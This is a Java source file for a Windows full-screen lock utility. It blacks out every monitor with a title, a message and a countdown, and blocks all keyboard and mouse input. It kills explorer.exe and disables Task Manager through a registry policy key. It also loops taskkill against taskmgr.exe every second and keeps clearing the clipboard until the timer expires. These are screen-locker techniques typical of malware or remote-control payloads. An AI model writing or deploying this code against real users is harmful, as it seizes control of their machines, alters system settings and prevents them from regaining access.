import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.StringSelection;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public class ScreenLock {

    private static final Object LOCK = new Object();

    private static List<JFrame> activeFrames = new ArrayList<>();
    private static Thread countdownThread;
    private static Thread enforceThread;
    private static Thread clipboardThread;
    private static final AtomicBoolean lockActive = new AtomicBoolean(false);
    private static final AtomicBoolean stopSignal = new AtomicBoolean(false);
    private static final AtomicInteger remainingSeconds = new AtomicInteger(0);
    private static volatile String lockTitle = "";
    private static volatile String lockMessage = "";
    private static boolean explorerKilled = false;

    public static boolean isLockActive() {
        return lockActive.get();
    }

    public static void showLockScreen(String titleText, String messageText, int durationMs) {
        synchronized (LOCK) {
            closeExistingSync();

            lockTitle = (titleText == null || titleText.trim().isEmpty()) ? "BILDIRIM" : titleText.toUpperCase();
            lockMessage = (messageText == null || messageText.trim().isEmpty()) ? "" : messageText;
            remainingSeconds.set(Math.max(1, durationMs / 1000));
            stopSignal.set(false);
            lockActive.set(true);
        }

        SwingUtilities.invokeLater(() -> {
            try {
                KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(e -> {
                    if (lockActive.get()) {
                        e.consume();
                        return true;
                    }
                    return false;
                });

                killExplorer();
                disableTaskManager();

                GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
                GraphicsDevice[] screens = ge.getScreenDevices();

                synchronized (LOCK) {
                    for (int i = 0; i < screens.length; i++) {
                        GraphicsDevice dev = screens[i];
                        Rectangle bounds = dev.getDefaultConfiguration().getBounds();
                        final boolean isPrimary = (i == 0);

                        JFrame frame = new JFrame(dev.getDefaultConfiguration());
                        frame.setUndecorated(true);
                        frame.setAlwaysOnTop(true);
                        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
                        frame.setResizable(false);
                        frame.setFocusableWindowState(true);

                        JPanel paintPanel = new JPanel() {
                            @Override
                            protected void paintComponent(Graphics g) {
                                Graphics2D g2 = (Graphics2D) g;
                                g2.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING, RenderingHints.VALUE_TEXT_ANTIALIAS_ON);
                                g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);

                                int w = getWidth();
                                int h = getHeight();

                                g2.setColor(new Color(0, 0, 0));
                                g2.fillRect(0, 0, w, h);

                                if (isPrimary) {
                                    g2.setColor(new Color(255, 255, 255));
                                    g2.setFont(new Font("Consolas", Font.BOLD, 56));
                                    FontMetrics fmTitle = g2.getFontMetrics();
                                    String title = lockTitle;
                                    int titleX = (w - fmTitle.stringWidth(title)) / 2;
                                    int titleY = fmTitle.getHeight() + 40;
                                    g2.drawString(title, titleX, titleY);

                                    String msg = lockMessage;
                                    if (!msg.isEmpty()) {
                                        g2.setColor(new Color(190, 190, 190));
                                        g2.setFont(new Font("Consolas", Font.PLAIN, 22));
                                        FontMetrics fmMsg = g2.getFontMetrics();

                                        int maxLineWidth = (int) (w * 0.80);
                                        List<String> lines = new ArrayList<>();
                                        String[] words = msg.split("\\s+");
                                        StringBuilder currentLine = new StringBuilder();

                                        for (String word : words) {
                                            String testLine = currentLine.length() == 0 ? word : currentLine + " " + word;
                                            if (fmMsg.stringWidth(testLine) > maxLineWidth) {
                                                if (currentLine.length() > 0) lines.add(currentLine.toString());
                                                currentLine = new StringBuilder(word);
                                            } else {
                                                currentLine = new StringBuilder(testLine);
                                            }
                                        }
                                        if (currentLine.length() > 0) lines.add(currentLine.toString());

                                        int lineHeight = fmMsg.getHeight() + 6;
                                        int totalTextHeight = lines.size() * lineHeight;
                                        int startY = (h / 2) - (totalTextHeight / 2);

                                        for (int l = 0; l < lines.size(); l++) {
                                            String lineText = lines.get(l);
                                            int lineX = (w - fmMsg.stringWidth(lineText)) / 2;
                                            g2.drawString(lineText, lineX, startY + (l * lineHeight));
                                        }
                                    }

                                    int secs = remainingSeconds.get();
                                    String timerStr = formatTime(secs);
                                    g2.setColor(new Color(255, 255, 255));
                                    g2.setFont(new Font("Consolas", Font.BOLD, 32));
                                    FontMetrics fmTimer = g2.getFontMetrics();
                                    int timerX = w - fmTimer.stringWidth(timerStr) - 50;
                                    int timerY = h - 50;
                                    g2.drawString(timerStr, timerX, timerY);
                                }
                            }
                        };

                        paintPanel.setOpaque(false);

                        frame.setContentPane(paintPanel);
                        frame.setBounds(bounds);

                        frame.addWindowFocusListener(new WindowFocusListener() {
                            @Override
                            public void windowGainedFocus(WindowEvent e) {}
                            @Override
                            public void windowLostFocus(WindowEvent e) {
                                SwingUtilities.invokeLater(() -> {
                                    if (frame.isVisible() && lockActive.get()) {
                                        frame.setAlwaysOnTop(true);
                                        frame.toFront();
                                        frame.requestFocus();
                                    }
                                });
                            }
                        });

                        frame.addWindowStateListener(e -> {
                            if ((e.getNewState() & Frame.ICONIFIED) == Frame.ICONIFIED) {
                                frame.setExtendedState(Frame.NORMAL);
                                frame.setBounds(bounds);
                                frame.toFront();
                            }
                        });

                        paintPanel.addMouseListener(new MouseAdapter() {
                            @Override public void mousePressed(MouseEvent e) { e.consume(); }
                            @Override public void mouseReleased(MouseEvent e) { e.consume(); }
                            @Override public void mouseClicked(MouseEvent e) { e.consume(); }
                        });
                        paintPanel.addMouseMotionListener(new MouseMotionAdapter() {
                            @Override public void mouseMoved(MouseEvent e) {}
                            @Override public void mouseDragged(MouseEvent e) { e.consume(); }
                        });

                        frame.setVisible(true);
                        frame.toFront();
                        frame.requestFocus();

                        activeFrames.add(frame);
                    }
                }

                enforceThread = new Thread(() -> {
                    while (!stopSignal.get()) {
                        try {
                            Runtime.getRuntime().exec("taskkill /F /IM taskmgr.exe");
                        } catch (Exception ignored) {}
                        try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
                    }
                }, "enforce-top");
                enforceThread.setDaemon(true);
                enforceThread.start();

                clipboardThread = new Thread(() -> {
                    while (!stopSignal.get()) {
                        try {
                            Toolkit.getDefaultToolkit().getSystemClipboard()
                                .setContents(new StringSelection(""), null);
                        } catch (Exception ignored) {}
                        try { Thread.sleep(300); } catch (InterruptedException e) { break; }
                    }
                }, "clipboard-clear");
                clipboardThread.setDaemon(true);
                clipboardThread.start();

                final JFrame primaryFrame = activeFrames.isEmpty() ? null : activeFrames.get(0);

                countdownThread = new Thread(() -> {
                    while (!stopSignal.get()) {
                        try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
                        if (stopSignal.get()) break;

                        int val = remainingSeconds.decrementAndGet();
                        if (val <= 0) {
                            closeExistingSync();
                            break;
                        }
                        if (primaryFrame != null) {
                            SwingUtilities.invokeLater(primaryFrame::repaint);
                        }
                    }
                }, "countdown");
                countdownThread.setDaemon(true);
                countdownThread.start();

            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    private static String formatTime(int totalSeconds) {
        if (totalSeconds < 0) totalSeconds = 0;
        int d = totalSeconds / 86400;
        int h = (totalSeconds % 86400) / 3600;
        int m = (totalSeconds % 3600) / 60;
        int s = totalSeconds % 60;
        if (d > 0) return String.format("%dd %02d:%02d:%02d", d, h, m, s);
        if (h > 0) return String.format("%02d:%02d:%02d", h, m, s);
        return String.format("%02d:%02d", m, s);
    }

    private static void killExplorer() {
        try {
            Runtime.getRuntime().exec("taskkill /F /IM explorer.exe");
            explorerKilled = true;
        } catch (Exception ignored) {}
    }

    private static void restoreExplorer() {
        if (explorerKilled) {
            try {
                Runtime.getRuntime().exec("explorer.exe");
                explorerKilled = false;
            } catch (Exception ignored) {}
        }
    }

    private static void disableTaskManager() {
        try {
            Runtime.getRuntime().exec(new String[]{
                "reg", "add",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"
            });
        } catch (Exception ignored) {}
    }

    private static void enableTaskManager() {
        try {
            Runtime.getRuntime().exec(new String[]{
                "reg", "delete",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                "/v", "DisableTaskMgr", "/f"
            });
        } catch (Exception ignored) {}
    }

    private static void closeExistingSync() {
        stopSignal.set(true);
        lockActive.set(false);

        if (countdownThread != null) { countdownThread.interrupt(); countdownThread = null; }
        if (enforceThread != null) { enforceThread.interrupt(); enforceThread = null; }
        if (clipboardThread != null) { clipboardThread.interrupt(); clipboardThread = null; }

        enableTaskManager();
        restoreExplorer();

        SwingUtilities.invokeLater(() -> {
            synchronized (LOCK) {
                for (JFrame f : activeFrames) {
                    try { f.dispose(); } catch (Exception ignored) {}
                }
                activeFrames.clear();
            }
        });
    }
}